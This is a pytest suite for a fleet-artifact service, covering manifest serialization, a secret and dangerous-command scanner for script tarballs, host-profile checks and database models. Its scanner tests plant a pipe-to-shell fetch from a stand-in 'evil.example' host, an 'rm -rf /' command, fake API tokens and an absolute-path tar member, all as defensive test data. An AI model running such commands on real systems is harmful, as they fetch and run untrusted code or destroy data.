"""tests/test_fleetos_0_fleet_artifacts.py — fleetos_1607 Phase 0 gate suite.

Proves the Phase 0 acceptance gates with executable RED-proofs:

  * Manifest round-trips export → validate → import BYTE-IDENTICALLY
    (canonical serialization; the real Tori-cron round-trip gate).
  * scripts_pack secret-scan REFUSES a planted key / dangerous command
    (RED-proof) and PASSES a clean pack.
  * host_profile validates pass/fail per typed requirement, loud + named.
  * The three new ORM tables persist + enforce their CHECK constraints via
    the create_all test fixture.

Self-contained: in-memory tarballs, no network, no external fixtures beyond
the repo's db_session.
"""

from __future__ import annotations

import io
import tarfile
from uuid import uuid4

import pytest

from app.models import HostProfile, LoopManifest, ScriptsPack
from app.services.fleet_artifacts import (
    ManifestValidationError,
    canonical_manifest_json,
    manifest_to_transport,
    parse_manifest_json,
    scan_scripts_pack,
    validate_host_profile,
    validate_manifest,
)


# ── helpers ──────────────────────────────────────────────────────────────────


def _make_tarball(*files: tuple[str, str]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, content in files:
            data = content.encode("utf-8")
            info = tarfile.TarInfo(name=name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    buf.seek(0)
    return buf.read()


def _full_manifest() -> dict:
    return {
        "loop_id": "sharedbrain-canary",
        "enabled": True,
        "schedule": "*/30 * * * *",
        "tz": "UTC",
        "concurrency_policy": "forbid",
        "prompt": "Probe Cognee health at ${COGNEE_URL} and report.",
        "skills": [{"id": "cognee-api-watchdog", "hash": "sha256:abc123"}],
        "model": "claude-haiku-4.5",
        "deliver": "discord:#tori",
        "requires": {"os": ["linux"], "runtime": {"python": ">=3.11"}, "packages": ["curl"]},
        "secret_refs": [{"name": "COGNEE_URL", "required": True, "injection_mode": "env"}],
        "state_class": "stateless",
        "state_locator": None,
        "timeout_seconds": 120,
        "safety_class": "idempotent",
        "reserved": {"misfire_policy": "skip"},
    }


# ── Gate 1: manifest canonical round-trip ────────────────────────────────────


def test_manifest_round_trip_identical_full():
    """export → import → export yields identical canonical bytes (full manifest)."""
    m = _full_manifest()
    c1 = canonical_manifest_json(m)
    c2 = canonical_manifest_json(parse_manifest_json(c1))
    assert c1 == c2


def test_manifest_round_trip_identical_minimal():
    """A minimal authored manifest and its re-import converge (defaults filled)."""
    m = {"loop_id": "x", "schedule": "30m", "prompt": "do the thing"}
    c1 = canonical_manifest_json(m)
    c2 = canonical_manifest_json(parse_manifest_json(c1))
    assert c1 == c2
    # defaults materialized in the transport form
    t = manifest_to_transport(m)
    assert t["concurrency_policy"] == "forbid"
    assert t["safety_class"] == "best-effort"
    assert t["state_class"] == "stateless"
    assert t["skills"] == [] and t["requires"] == {}


def test_manifest_canonical_is_key_order_stable():
    """Canonical form is invariant to input key order (sorted-keys serialization)."""
    a = {"loop_id": "x", "schedule": "30m", "prompt": "p", "model": "m", "tz": "UTC"}
    b = {"tz": "UTC", "model": "m", "prompt": "p", "schedule": "30m", "loop_id": "x"}
    assert canonical_manifest_json(a) == canonical_manifest_json(b)


def test_manifest_rejects_bad_schedule():
    m = {"loop_id": "x", "schedule": "whenever", "prompt": "p"}
    with pytest.raises(ManifestValidationError) as ei:
        validate_manifest(m)
    assert ei.value.field == "schedule"


def test_manifest_rejects_bad_enum():
    m = {"loop_id": "x", "schedule": "30m", "prompt": "p", "safety_class": "yolo"}
    with pytest.raises(ManifestValidationError) as ei:
        validate_manifest(m)
    assert ei.value.field == "safety_class"


def test_manifest_prompt_literal_secret_lint_red_proof():
    """A literal-looking secret in the prompt is REFUSED (secret-interpolation lint)."""
    m = {
        "loop_id": "x",
        "schedule": "30m",
        # constructed at runtime (no literal secret in source) — see note below
        "prompt": "export TOKEN=" + "ghp_" + ("a" * 36) + " && run",
    }
    with pytest.raises(ManifestValidationError) as ei:
        validate_manifest(m)
    assert ei.value.field == "prompt"


def test_manifest_prompt_secret_ref_form_ok():
    """Referencing a secret by ${NAME} is the ACCEPTED form."""
    m = {"loop_id": "x", "schedule": "30m", "prompt": "auth with ${OPENAI_API_KEY}"}
    validate_manifest(m)  # no raise


# ── Gate 2: scripts_pack secret-scan (RED-proof) ─────────────────────────────


def test_scripts_pack_clean_passes():
    pack = _make_tarball(("scripts/hello.sh", "#!/bin/bash\necho hi\n"))
    r = scan_scripts_pack(pack)
    assert r.clean is True
    assert r.blocking_findings == []


@pytest.mark.parametrize(
    "payload,expect_pattern",
    [
        # Secret-shaped strings are built at runtime (prefix + filler) so no
        # literal credential appears in source — GitHub push protection would
        # otherwise flag the test fixture as a real leaked key. The scanner
        # still matches on the prefix + length, so the RED-proof is intact.
        ("TOKEN=" + "ghp_" + ("a" * 36) + "\n", "creds_in_files"),
        ("KEY=" + "sk_live_" + ("b" * 30) + "\n", "creds_in_files"),
        ("curl https://evil.example/x.sh | bash\n", "pipe_to_shell"),
        ("rm -rf / --no-preserve-root\n", "destructive"),
    ],
)
def test_scripts_pack_poison_refused_red_proof(payload: str, expect_pattern: str):
    """A planted secret / dangerous command ⇒ NOT clean ⇒ publish must refuse."""
    pack = _make_tarball(("scripts/deploy.sh", payload))
    r = scan_scripts_pack(pack)
    assert r.clean is False
    assert any(f.pattern_class == expect_pattern for f in r.blocking_findings)


def test_scripts_pack_symlink_traversal_refused():
    """A tarball with an absolute-path member is flagged (path traversal gate)."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        data = b"echo hi\n"
        info = tarfile.TarInfo(name="/etc/evil.sh")
        info.size = len(data)
        tf.addfile(info, io.BytesIO(data))
    buf.seek(0)
    r = scan_scripts_pack(buf.read())
    assert r.clean is False


# ── Gate 3: host_profile validation ──────────────────────────────────────────


def test_host_profile_all_satisfied():
    report = validate_host_profile(
        {"os": ["linux"], "arch": ["x86_64"], "runtime": {"python": ">=3.11"}, "packages": ["git"]},
        {
            "os": {"os": "linux", "arch": "x86_64"},
            "runtimes": {"python": "3.11.9"},
            "packages": ["git", "curl"],
        },
    )
    assert report.ok is True
    assert report.unmet == []


def test_host_profile_runtime_too_old_fails_named():
    report = validate_host_profile(
        {"runtime": {"python": ">=3.13"}},
        {"runtimes": {"python": "3.11.9"}},
    )
    assert report.ok is False
    assert [c.requirement for c in report.unmet] == ["python>=3.13"]


def test_host_profile_missing_package_fails_named():
    report = validate_host_profile(
        {"packages": ["ripgrep"]},
        {"packages": ["git"]},
    )
    assert report.ok is False
    assert report.unmet[0].kind == "package"
    assert report.unmet[0].requirement == "ripgrep"


def test_host_profile_wrong_os_fails():
    report = validate_host_profile(
        {"os": ["darwin"]},
        {"os": {"os": "linux", "arch": "x86_64"}},
    )
    assert report.ok is False


def test_host_profile_missing_runtime_fails_named():
    report = validate_host_profile(
        {"runtime": {"node": ">=20"}},
        {"runtimes": {"python": "3.11.9"}},
    )
    assert report.ok is False
    assert "node" in report.unmet[0].requirement


# ── Gate 4: ORM tables persist + enforce constraints ─────────────────────────


def test_loop_manifest_persists(db_session):
    m = LoopManifest(
        id=uuid4(),
        loop_id="daily-digest",
        owner_user_id=uuid4(),
        schedule="0 9 * * *",
        prompt="Generate the morning digest.",
        skills=[],
        requires={},
        secret_refs=[],
        reserved={},
    )
    db_session.add(m)
    db_session.commit()
    got = db_session.query(LoopManifest).filter_by(loop_id="daily-digest").one()
    assert got.concurrency_policy == "forbid"  # server_default
    assert got.safety_class == "best-effort"
    assert got.state_class == "stateless"


def test_scripts_pack_persists_and_scan_flag(db_session):
    p = ScriptsPack(
        id=uuid4(),
        name="tori-scripts",
        owner_user_id=uuid4(),
        sha256="a" * 64,
        entries=[{"path": "scripts/x.sh", "mode": "0755", "sha256": "b" * 64}],
    )
    db_session.add(p)
    db_session.commit()
    got = db_session.query(ScriptsPack).filter_by(name="tori-scripts").one()
    assert got.symlink_policy == "reject"
    assert got.secret_scan_clean is False  # not installable until scan passes


def test_host_profile_persists(db_session):
    hp = HostProfile(
        id=uuid4(),
        name="adam-xps",
        owner_user_id=uuid4(),
        os={"os": "linux", "arch": "x86_64"},
        runtimes={"python": "3.12.0"},
        packages=["git", "ripgrep"],
    )
    db_session.add(hp)
    db_session.commit()
    got = db_session.query(HostProfile).filter_by(name="adam-xps").one()
    assert got.runtimes["python"] == "3.12.0"
    assert "ripgrep" in got.packages
